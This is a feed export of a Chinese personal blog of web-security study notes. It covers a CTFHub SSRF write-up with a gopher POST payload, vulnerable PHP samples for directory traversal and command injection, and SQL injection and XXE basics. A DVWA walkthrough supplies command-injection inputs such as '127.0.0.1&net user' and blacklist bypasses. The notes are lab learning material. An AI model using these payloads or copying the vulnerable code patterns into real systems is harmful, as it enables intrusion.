class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$host=$_GET[&#x27;url&#x27;];</span><br><span class="line">$fp = fsockopen(&quot;$host&quot;,80, $errno, $errstr,30);</span><br><span class="line">if(!$fp)&#123;</span><br><span class="line">echo &quot;$errstr ($errno)&lt;br /&gt;\n&quot;;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">$out =&quot;GET / HTTP/1.1\r\n&quot;;</span><br><span class="line">$out .=&quot;Host: $host\r\n&quot;;</span><br><span class="line">$out .=&quot;Connection: Close\r\n\r\n&quot;;</span><br><span class="line">fwrite($fp, $out);</span><br><span class="line">while(!feof($fp))&#123;</span><br><span class="line">echo fgets($fp,1024);</span><br><span class="line">&#125;</span><br><span class="line">fclose($fp);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>函数实现对用户指定url数据的获取，该函数使用socket（端口）跟服务器建立tcp连接，传输数据。变量host为主机名，port为端口，errstr表示错误信息将以字符串的信息返回，30为时限,传输原始数据</p><h2 id="CTFHub-ssrf-POST请求"><a href="#CTFHub-ssrf-POST请求" class="headerlink" title="CTFHub-ssrf-POST请求"></a>CTFHub-ssrf-POST请求</h2><p>hint:这次是发一个HTTP POST请求.对了.ssrf是用php的curl实现的.并且会跟踪302跳转.加油吧骚年<br>curl:强大的开源库,支持多种协议，用来发送请求<br>御剑扫描php  200、3xx，探测到flag.php、index.php  &#x2F;&#x2F;扫不到<br><code>?url=127.0.0.1/flag.php</code>请求本地文件，右键源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=&quot;/flag.php&quot; method=&quot;post&quot;&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; name=&quot;key&quot;&gt;</span><br><span class="line">&lt;!-- Debug: key=f27ff60682bab433bdd6eaf0d129d94f--&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure><p>发现key<br>?url&#x3D;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> </span><br><span class="line">error_reporting(0);</span><br><span class="line"> </span><br><span class="line">if (!isset($_REQUEST[&#x27;url&#x27;]))&#123;</span><br><span class="line">    header(&quot;Location: /?url=_&quot;);</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">$ch = curl_init();                               //初始化一次curl对话，ch返回curl句柄</span><br><span class="line">curl_setopt($ch, CURLOPT_URL, $_REQUEST[&#x27;url&#x27;]); //curlopt_url需要获取的 URL 地址</span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, 0);             //启用时会将头文件的信息作为数据流输出。</span><br><span class="line">curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);     // 位掩码， 1 (301 永久重定向)</span><br><span class="line">curl_exec($ch);</span><br><span class="line">curl_close($ch);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>?url&#x3D;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> </span><br><span class="line">error_reporting(0);</span><br><span class="line"> </span><br><span class="line">if ($_SERVER[&quot;REMOTE_ADDR&quot;] != &quot;127.0.0.1&quot;) &#123;</span><br><span class="line">    echo &quot;Just View From 127.0.0.1&quot;;</span><br><span class="line">    return;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">$flag=getenv(&quot;CTFHUB&quot;);</span><br><span class="line">$key = md5($flag);</span><br><span class="line"> </span><br><span class="line">if (isset($_POST[&quot;key&quot;]) &amp;&amp; $_POST[&quot;key&quot;] == $key) &#123;</span><br><span class="line">    echo $flag;                                      #当post传值为key时使出flag</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"> </span><br><span class="line">&lt;form action=&quot;/flag.php&quot; method=&quot;post&quot;&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; name=&quot;key&quot;&gt;</span><br><span class="line">&lt;!-- Debug: key=&lt;?php echo $key;?&gt;--&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure><p>思路：往flag.php传key值就可以得到flag，而index.php可以利用curl传url，那么我们可以用gopher协议在index.php中构造post请求包往flag.php传key值，以此获取flag<br>POST包必须包含的四个参数：Content-Type,Content-Length,host,post<br>POST包如下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST /flag.php HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:80</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 36                //长度为key的长度</span><br><span class="line">key=ed200db79375f224af615ef4be4a006f</span><br></pre></td></tr></table></figure><p>gopher的数据需要用url编码三次之后再发送<br><img src="/img/208.png"><br>第一次编码后的数据%0A替换%0D%0A，把替换后的数据进行第二次url编码，为什么要把%0A替换呢？回车换行，编码的时候忽略了LF（换行）<br>url在线：<a href="http://www.jsons.cn/urlencode/">http://www.jsons.cn/urlencode/</a><br>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?url=http://127.0.0.1:80/index.php?url=gopher://127.0.0.1:80/_POST%252520%25252Fflag.php%252520HTTP%25252F1.1%25250D%25250AHost%25253A%252520127.0.0.1%25253A80%25250D%25250AContent-Length%25253A%25252036%25250D%25250AContent-Type%25253A%252520application%25252Fx-www-form-urlencoded%25250D%25250A%25250D%25250Akey%25253Ded200db79375f224af615ef4be4a006f</span><br></pre></td></tr></table></figure><p>&#x2F;&#x2F;前面的http可加可不加<br>为什么不同的在线解码url结果不同<br>redis是什么<br>参考：<a href="https://blog.csdn.net/Reme_mber/article/details/125581479">从一文中了解SSRF的各种绕过姿势及攻击思路</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web漏洞</title>
      <link href="/web%E6%BC%8F%E6%B4%9E.html"/>
      <url>/web%E6%BC%8F%E6%B4%9E.html</url>
      
        <content type="html"><![CDATA[<h2 id="目录遍历漏洞"><a href="#目录遍历漏洞" class="headerlink" title="目录遍历漏洞"></a>目录遍历漏洞</h2><p>漏洞源码1：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_GET[&#x27;title&#x27;]))&#123;</span><br><span class="line">    $filename=$_GET[&#x27;title&#x27;];</span><br><span class="line">    //这里直接把传进来的内容进行了require(),造成问题</span><br><span class="line">    require &quot;soup/$filename&quot;;</span><br></pre></td></tr></table></figure><p>在dir_list.php文件中直接包含了soup文件夹下的文件，引发了目录遍历漏洞，通过此漏洞可能读取到网站根目录中的敏感文件（..&#x2F;)</p><p>因为title&#x3D;soup&#x2F;jarheads.php传入的php文件是嵌套在html中的，所以会在界面中展示</p><p>上面只是包含，加上这几行代码，查看源代码显示</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$filename = &quot;soup/$filename&quot;;</span><br><span class="line">$handle = fopen ($filename,&quot;r&quot;) ;</span><br><span class="line">$contents = fread($handle,filesize($filename) ) ;</span><br><span class="line">echo $contents;</span><br></pre></td></tr></table></figure><p>漏洞源码2：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">function my_dir($dir) &#123;</span><br><span class="line">$files = [];</span><br><span class="line">if(@$handle = opendir($dir)) &#123;</span><br><span class="line">while(($file = readdir($handle)) !== false) &#123;</span><br><span class="line">if($file != &quot;..&quot; &amp;&amp; $file != &quot;.&quot;) &#123;</span><br><span class="line">if(is_dir($dir . &quot;/&quot; . $file)) &#123; //如果是子文件夹，进行递归</span><br><span class="line">$files[$file] = my_dir($dir . &quot;/&quot; . $file);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">$files[] = $file;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">        closedir($handle);</span><br><span class="line">    &#125;</span><br><span class="line">return $files;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo &quot;&lt;pre&gt;&quot;;</span><br><span class="line">$d=$_GET[&#x27;d&#x27;];   //没有防范</span><br><span class="line">print_r(my_dir($d));</span><br><span class="line">echo &quot;&lt;/pre&gt;&quot;;</span><br></pre></td></tr></table></figure><p>传入参数d&#x3D;pikachu，就会遍历目录下的所有文件，会出现..\打印上级目录，这样会出现网站源码结构泄露</p><h2 id="sql注入漏洞"><a href="#sql注入漏洞" class="headerlink" title="sql注入漏洞"></a>sql注入漏洞</h2><p>sql注入就是在数据交互中，前端数据传到后台时没有做严格的判断，导致传进来的数据被拼接到sql语句中，被当作sql语句的一部分进行执行</p><p><img src="/img/203.png"></p><h3 id="注入时信息收集"><a href="#注入时信息收集" class="headerlink" title="注入时信息收集"></a>注入时信息收集</h3><p><img src="/img/204.png"><br>mysql的版本5.0以上才有information_schema数据库</p><ul><li>信息收集：<br>查询数据库 version()<br>数据库名字 databaase()<br>数据库用户 user()<br>操作系统 @@version_compile_os</li></ul><p>跨库查询：目标网站的同一个服务器中如果存在一个网站的数据库是使用root权限连接的，且存在sql注入漏洞，就会有被跨库攻击的风险。数据库名存放在information_schema.schemata表中的schema_name字段，查询方式和查表名一致</p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XXE</title>
      <link href="/XXE.html"/>
      <url>/XXE.html</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>XXE就是XML外部实体注入，当允许引用外部实体时， XML数据在传输中有可能会被不法分子被修改，如果服务器执行被恶意插入的代码，就可以实现攻击的目的攻击者可以通过构造恶意内容，就可能导致任意文件读取，系统命令执行，内网端口探测，攻击内网网站等危害</p><h2 id="XML"><a href="#XML" class="headerlink" title="XML"></a>XML</h2><p>用来进行数据的传输和存储，有标签构成<br>XML和HTML的区别：XML被设计用来传输和存储数据，HTML被设计用来显示数据<br><strong>xml实体</strong></p><p><strong>基本结构</strong><br>XML声明，DTD部分，XML部分</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=’1.0’?&gt;   // 声明XML解析器版本 </span><br><span class="line"> </span><br><span class="line">// 运用实体定义变量的写法 </span><br><span class="line">// 即声明一个name变量，值为john</span><br><span class="line">&lt;!DOCTYPE person[         </span><br><span class="line">&lt;!ENTITY name “john”&gt;      </span><br><span class="line">]&gt;</span><br><span class="line"> </span><br><span class="line">// 引用一般实体的写法，格式为&quot;&amp;实体名称;&quot;</span><br><span class="line">&lt;person&gt;      </span><br><span class="line">&lt;name&gt;&amp;name;&lt;/name&gt;   </span><br><span class="line">&lt;age&gt;20&lt;/age&gt;</span><br><span class="line">&lt;/person&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo+github博客搭建</title>
      <link href="/hexo-github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA.html"/>
      <url>/hexo-github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA.html</url>
      
        <content type="html"><![CDATA[<p><strong>1、git、nodejs安装</strong><br>都是一直下一步,node安装稳定版,npm在弄得安装时自动安装<br><a href="https://git-scm.com/downloads">git</a><br><a href="https://nodejs.org/zh-cn">Nodejs</a><br>git -v 、node -v、npm -v</p><p><strong>2、Hexo框架安装</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo -g //hexo命令安装，hexo version</span><br><span class="line">hexo init blog //初始化blog，会在当前目录创建名为blog的博客文件夹</span><br><span class="line">npm install //安装依赖</span><br></pre></td></tr></table></figure><p>以上都做完，博客就在本地搭建成功了</p><p><strong>3、部署到GitHub</strong><br>创建一个新仓库<br><img src="/img/196.png"><br>Repository name: yzklov.github.io  &#x2F;&#x2F;用户名.github.io,固定格式<br>选择public，创建仓库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name &quot;yzklov&quot; //github用户名</span><br><span class="line">git config --global user.email &quot;1610114502@qq.com&quot; //创建github的邮箱</span><br><span class="line">npm install hexo-deployer-git --save //安装插件</span><br></pre></td></tr></table></figure><p>创建ssh密钥<br><code>ssh-keygen -t rsa </code>   &#x2F;&#x2F;完成以后按直接三下回车跳过<br>将.ssh文件里的id_rsa.pub文件里的全部内容复制下来，在github-&gt;setting里创建密钥，名字是填github用户名，然后把内容复制进去<br>修改_config.yml文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># Deployment</span><br><span class="line">## Docs: https://hexo.io/docs/one-command-deployment</span><br><span class="line">deploy:</span><br><span class="line">  type: &#x27;git&#x27;</span><br><span class="line">  repo: &#x27;git@github.com:yzklov/yzklov.github.io.git&#x27;</span><br><span class="line">  branch: main</span><br></pre></td></tr></table></figure><p>可以上传到github了</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CSRF</title>
      <link href="/CSRF.html"/>
      <url>/CSRF.html</url>
      
        <content type="html"><![CDATA[<h2 id="什么是CSRF？"><a href="#什么是CSRF？" class="headerlink" title="什么是CSRF？"></a>什么是CSRF？</h2><blockquote><p>跨站请求伪造，冒用Cookie中的信息，发起请求攻击。<br>CSRF（Cross-site request forgery）跨站请求伪造：攻击者诱导受害者进入第三方网站，在第三方网站中，向被攻击网站发送跨站请求。利用受害者在被攻击网站已经获取的注册凭证，绕过后台的用户验证，达到冒充用户对被攻击的网站执行某项操作的目的。</p></blockquote><h2 id="CSRF攻击过程"><a href="#CSRF攻击过程" class="headerlink" title="CSRF攻击过程"></a>CSRF攻击过程</h2><p>1、当用户已经登录成功了一个网站<br>2、然后通过被诱导进了第三方网站「钓鱼网站」<br>3、跳转过去了自动提交表单，冒用受害者信息<br>4、后台则正常走逻辑将用户提交的表单信息进行处理</p><h2 id="CSRF的特点"><a href="#CSRF的特点" class="headerlink" title="CSRF的特点"></a>CSRF的特点</h2><p>攻击一般发起在第三方网站，而不是被攻击的网站。被攻击的网站无法防止攻击发生。 攻击利用受害者在被攻击网站的登录凭证，冒充受害者提交操作；而不是直接窃取数据，整个过程攻击者并不能获取到受害者的登录凭证，仅仅是“冒用”。 跨站请求可以用各种方式：图片URL、超链接、CORS、Form提交等等。部分请求方式可以直接嵌入在第三方论坛、文章中，难以进行追踪。 CSRF通常是跨域的，因为外域通常更容易被攻击者掌控。但是如果本域下有容易被利用的功能，比如可以发图和链接的论坛和评论区，攻击可以直接在本域下进行，而且这种攻击更加危险。</p><h2 id="防护策略"><a href="#防护策略" class="headerlink" title="防护策略"></a>防护策略</h2><p>CSRF通常从第三方网站发起，被攻击的网站无法防止攻击发生，只能通过增强自己网站针对CSRF的防护能力来提升安全性。</p><p><strong>Token：存在本地local strage中的加密数据</strong><br>token是一个比较有效的CSRF防护方法，只要页面没有XSS漏洞泄露Token，那么接口的CSRF攻击就无法成功，也是现在主流的解决方案。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>dvwa</title>
      <link href="/dvwa.html"/>
      <url>/dvwa.html</url>
      
        <content type="html"><![CDATA[<h2 id="暴力破解-Brute-Force"><a href="#暴力破解-Brute-Force" class="headerlink" title="暴力破解(Brute Force)"></a>暴力破解(Brute Force)</h2><p>暴力破解或称为穷举法，是一种针对于密码的破译方法，即将密码进行逐个推算直到找出真正的密码为止<br><img src="/./img/163.png"></p><h2 id="Command-Injection"><a href="#Command-Injection" class="headerlink" title="Command Injection"></a>Command Injection</h2><h3 id="low"><a href="#low" class="headerlink" title="low"></a>low</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &#x27;Submit&#x27; ]  ) ) &#123;</span><br><span class="line">    // Get input</span><br><span class="line">    $target = $_REQUEST[ &#x27;ip&#x27; ];</span><br><span class="line"></span><br><span class="line">    // 确定操作系统并执行ping命令</span><br><span class="line">    if( stristr( php_uname( &#x27;s&#x27; ), &#x27;Windows NT&#x27; ) ) &#123;</span><br><span class="line">        // 判断函数的返回值有没有Windows</span><br><span class="line">        $cmd = shell_exec( &#x27;ping  &#x27; . $target );</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        // *nix</span><br><span class="line">        $cmd = shell_exec( &#x27;ping  -c 4 &#x27; . $target );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Feedback for the end user</span><br><span class="line">    echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure><ul><li>php_uname()会返回操作系统的一些相关信息，其中就包括操作系统的名称，之后带入到stristr()函数查找windows NT，如果有就会返回字符串的剩余部分（从匹配点）。如果未找到所搜索的字符串，则返回 FALSE</li><li>shell_exec() — 通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回<br>可以直接进行命令注入：<br><code>127.0.0.1&amp;ipconfig</code><br><code>127.0.0.1&amp;net user</code><br><code>127.0.0.1&amp;systeminfo</code><br><code>127.0.0.1&amp;dir</code><br>当然也可以使用管道符|,|的输出只有后面指令的，因为|的含义是将前面命令的标准输出作为后面命令的标准输入</li></ul><h3 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &#x27;Submit&#x27; ]  ) ) &#123;</span><br><span class="line">    // Get input</span><br><span class="line">    $target = $_REQUEST[ &#x27;ip&#x27; ];</span><br><span class="line"></span><br><span class="line">    // Set blacklist</span><br><span class="line">    $substitutions = array(</span><br><span class="line">        &#x27;&amp;&amp;&#x27; =&gt; &#x27;&#x27;,</span><br><span class="line">        &#x27;;&#x27;  =&gt; &#x27;&#x27;,</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    // Remove any of the charactars in the array (blacklist).</span><br><span class="line">    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );</span><br><span class="line"></span><br><span class="line">    // Determine OS and execute the ping command.</span><br><span class="line">    if( stristr( php_uname( &#x27;s&#x27; ), &#x27;Windows NT&#x27; ) ) &#123;</span><br><span class="line">        // Windows</span><br><span class="line">        $cmd = shell_exec( &#x27;ping  &#x27; . $target );</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        // *nix</span><br><span class="line">        $cmd = shell_exec( &#x27;ping  -c 4 &#x27; . $target );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Feedback for the end user</span><br><span class="line">    echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>array_keys() 函数返回包含数组中所有键名的一个新数组<br>eg:<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$substitutions = array(&#x27;&amp;&amp;&#x27; =&gt; &#x27;&#x27;,&#x27;;&#x27;  =&gt; &#x27;&#x27;,);</span><br><span class="line">print_r(array_keys( $substitutions ));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>输出：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; &amp;&amp;</span><br><span class="line">    [1] =&gt; ;</span><br><span class="line">)</span><br></pre></td></tr></table></figure></li><li>str_replace():array_keys( $substitutions )规定查找的字符；$substitutions是规定查找到后要替换成的值；$target是目标字符串<br>下面的代码后low一样，所以可以使用&amp;来拼接也可以这样绕过：<code>127.0.0.1 &amp;;&amp; ipconfig</code></li></ul><h3 id="high"><a href="#high" class="headerlink" title="high"></a>high</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$substitutions = array(</span><br><span class="line">        &#x27;&amp;&#x27;  =&gt; &#x27;&#x27;,</span><br><span class="line">        &#x27;;&#x27;  =&gt; &#x27;&#x27;,</span><br><span class="line">        &#x27;| &#x27; =&gt; &#x27;&#x27;,</span><br><span class="line">        &#x27;-&#x27;  =&gt; &#x27;&#x27;,</span><br><span class="line">        &#x27;$&#x27;  =&gt; &#x27;&#x27;,</span><br><span class="line">        &#x27;(&#x27;  =&gt; &#x27;&#x27;,</span><br><span class="line">        &#x27;)&#x27;  =&gt; &#x27;&#x27;,</span><br><span class="line">        &#x27;`&#x27;  =&gt; &#x27;&#x27;,</span><br><span class="line">        &#x27;||&#x27; =&gt; &#x27;&#x27;,</span><br><span class="line">    ); </span><br></pre></td></tr></table></figure><p>和medium的差别就是黑名单过滤变多了，其中最后一个存在空格，所以可以使用<code>127.0.0.1|| net user</code></p><h3 id="impossible"><a href="#impossible" class="headerlink" title="impossible"></a>impossible</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &#x27;Submit&#x27; ]  ) ) &#123;</span><br><span class="line">    // Check Anti-CSRF token</span><br><span class="line">    checkToken( $_REQUEST[ &#x27;user_token&#x27; ], $_SESSION[ &#x27;session_token&#x27; ], &#x27;index.php&#x27; );</span><br><span class="line"></span><br><span class="line">    // Get input</span><br><span class="line">    $target = $_REQUEST[ &#x27;ip&#x27; ];</span><br><span class="line">    $target = stripslashes( $target );</span><br><span class="line"></span><br><span class="line">    // 将ip分成4个八位字节</span><br><span class="line">    $octet = explode( &quot;.&quot;, $target );</span><br><span class="line"></span><br><span class="line">    // Check IF each octet is an integer</span><br><span class="line">    if( ( is_numeric( $octet[0] ) ) &amp;&amp; ( is_numeric( $octet[1] ) ) &amp;&amp; ( is_numeric( $octet[2] ) ) &amp;&amp; ( is_numeric( $octet[3] ) ) &amp;&amp; ( sizeof( $octet ) == 4 ) ) &#123;</span><br><span class="line">        // If all 4 octets are int&#x27;s put the IP back together.</span><br><span class="line">        $target = $octet[0] . &#x27;.&#x27; . $octet[1] . &#x27;.&#x27; . $octet[2] . &#x27;.&#x27; . $octet[3];</span><br><span class="line"></span><br><span class="line">        // Determine OS and execute the ping command.</span><br><span class="line">        if( stristr( php_uname( &#x27;s&#x27; ), &#x27;Windows NT&#x27; ) ) &#123;</span><br><span class="line">            // Windows</span><br><span class="line">            $cmd = shell_exec( &#x27;ping  &#x27; . $target );</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            // *nix</span><br><span class="line">            $cmd = shell_exec( &#x27;ping  -c 4 &#x27; . $target );</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // Feedback for the end user</span><br><span class="line">        echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        // Ops. Let the user name theres a mistake</span><br><span class="line">        echo &#x27;&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Generate Anti-CSRF token</span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure><p>查看代码，impossible级别的代码加入了Anti-CSRF:token，同时对参数ip进行了严格限制，只有像“数字.数字.数字.数字”的输入才会被接收执行，因此不存在命令注入漏洞。<br><strong>源码分析</strong><br>先checkToken，检查了token，然后把输入的ip&#x3D;()删除反斜杠，接着用explode()函数把传入的命令以.为分界分成4个部分，然后if语句中使用is_numeric()函数来验证每个部分是不是数字，sizeof()函数检查是不是四个部分，如果以上都满足就将四个部分拼接在一起进行命令执行，否则报错。最后生成生成反csrf令牌。</p><h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><h3 id="low-1"><a href="#low-1" class="headerlink" title="low"></a>low</h3><p>这是一个修改密码的页面，修改试试，修改成功，并且是以get方式传输的<br><img 